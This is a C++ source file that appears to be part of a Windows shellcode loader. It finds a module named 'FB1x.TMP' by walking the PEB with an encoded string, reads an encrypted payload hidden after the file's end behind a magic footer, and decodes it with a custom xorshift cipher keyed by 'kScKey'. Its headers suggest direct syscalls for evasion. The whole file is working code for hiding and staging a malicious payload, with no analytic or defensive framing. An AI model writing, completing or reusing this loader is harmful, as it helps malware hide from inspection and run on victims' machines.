#include "bytes.h"
#include "sckey.h"
#include "syscalls.h"

#include <windows.h>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

namespace
{
    HMODULE g_payloadModule = nullptr;

    template <typename T, std::size_t N>
    void AppendChunk(std::vector<unsigned char>& destination,
                     const T (&chunk)[N])
    {
        // Each chunk is a concatenated string literal, so exclude its
        // compiler-added trailing '\0'.
        destination.insert(destination.end(), chunk, chunk + N - 1);
    }

    std::uint64_t InitializeState(std::uint32_t key, std::size_t length)
    {
        std::uint64_t state = 0xD6E8FEB86659FD93ull;
        state ^= (static_cast<std::uint64_t>(key) << 32) | key;
        state ^= static_cast<std::uint64_t>(key) * 0x9E3779B185EBCA87ull;
        state ^= static_cast<std::uint64_t>(length) * 0xC2B2AE3D27D4EB4Full;

        state ^= state >> 30;
        state *= 0xBF58476D1CE4E5B9ull;
        state ^= state >> 27;
        state *= 0x94D049BB133111EBull;
        state ^= state >> 31;
        return state;
    }

    std::uint64_t NextWord(std::uint64_t& state)
    {
        state ^= state >> 12;
        state ^= state << 25;
        state ^= state >> 27;
        return state * 0x2545F4914F6CDD1Dull;
    }

    unsigned char RotateRight8(unsigned char value, unsigned int count)
    {
        if (count == 0) return value;
        return static_cast<unsigned char>((value >> count) | (value << (8u - count)));
    }

    unsigned char MaskByte(std::uint64_t word, std::size_t index)
    {
        const unsigned int shift = static_cast<unsigned int>((index & 7u) * 8u);
        unsigned char mask = static_cast<unsigned char>((word >> shift) & 0xFFu);
        const std::uint64_t position = static_cast<std::uint64_t>(index);
        mask ^= static_cast<unsigned char>((position * 0x9Du + (position >> 8)) & 0xFFu);
        return mask;
    }

    std::vector<unsigned char> DecodePackedData(
        const std::vector<unsigned char>& packed)
    {
        std::vector<unsigned char> decoded(packed.size());
        std::uint64_t state = InitializeState(kScKey, packed.size());

        for (std::size_t i = 0; i < packed.size(); ++i) {
            const std::uint64_t word = NextWord(state);
            const unsigned int rotation = static_cast<unsigned int>((word >> 61) & 7u);
            const unsigned char rotated = RotateRight8(packed[i], rotation);
            decoded[i] = static_cast<unsigned char>(rotated ^ MaskByte(word, i));
        }

        return decoded;
    }

    bool ReadPackedPayload(std::vector<unsigned char>& packed)
    {
        if (!g_payloadModule) {
            return false;
        }

        wchar_t modulePathBuffer[32768] = {};
        if (!PebGetModulePath(
                WENC(L"FB1x.TMP"),
                modulePathBuffer,
                static_cast<DWORD>(_countof(modulePathBuffer)))) {
            return false;
        }
        const std::wstring modulePath(modulePathBuffer);

        HANDLE file = CreateFileW(
            modulePath.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr);
        if (file == INVALID_HANDLE_VALUE) {
            return false;
        }

        constexpr LONGLONG kFooterSize = 12;
        constexpr unsigned char kPayloadMagic[] = {
            0xF5, 0xE1, 0x93, 0xFF, 0xF7, 0xE6, 0xFE, 0xEB
        };
        bool ok = false;
        LARGE_INTEGER end{};
        do {
            if (!SetFilePointerEx(file, {}, &end, FILE_END) ||
                end.QuadPart <= kFooterSize) {
                break;
            }

            const LONGLONG fileSize = end.QuadPart;
            LARGE_INTEGER footerOffset{};
            footerOffset.QuadPart = fileSize - kFooterSize;
            if (!SetFilePointerEx(file, footerOffset, nullptr, FILE_BEGIN)) {
                break;
            }

            char magic[sizeof(kPayloadMagic)] = {};
            std::uint32_t payloadSize = 0;
            DWORD bytesRead = 0;
            if (!ReadFile(file, magic, sizeof(magic), &bytesRead, nullptr) ||
                bytesRead != sizeof(magic) ||
                !ReadFile(file, &payloadSize, sizeof(payloadSize), &bytesRead, nullptr) ||
                bytesRead != sizeof(payloadSize)) {
                break;
            }

            bool magicMatches = true;
            for (std::size_t i = 0; i < sizeof(kPayloadMagic); ++i) {
                if (static_cast<unsigned char>(magic[i]) != kPayloadMagic[i]) {
                    magicMatches = false;
                    break;
                }
            }
            if (!magicMatches || payloadSize == 0) {
                break;
            }

            const LONGLONG payloadOffset =
                fileSize - kFooterSize - static_cast<LONGLONG>(payloadSize);
            if (payloadOffset < 0 || payloadOffset > fileSize) {
                break;
            }

            LARGE_INTEGER payloadPosition{};
            payloadPosition.QuadPart = payloadOffset;
            if (!SetFilePointerEx(file, payloadPosition, nullptr, FILE_BEGIN)) {
                break;
            }

            packed.resize(payloadSize);
            if (!ReadFile(
                    file,
                    packed.data(),
                    payloadSize,
                    &bytesRead,
                    nullptr) ||
                bytesRead != payloadSize) {
                packed.clear();
                break;
            }

            ok = true;
        } while (false);

        CloseHandle(file);
        return ok;
    }
}

std::vector<unsigned char> buf;

void SetPayloadModule(HMODULE module)
{
    g_payloadModule = module;
}

void DecodePackedPayload(std::vector<unsigned char>& decoded)
{
    buf.clear();
    decoded.clear();

    if (!ReadPackedPayload(buf)) {
        return;
    }

    decoded = DecodePackedData(buf);
}
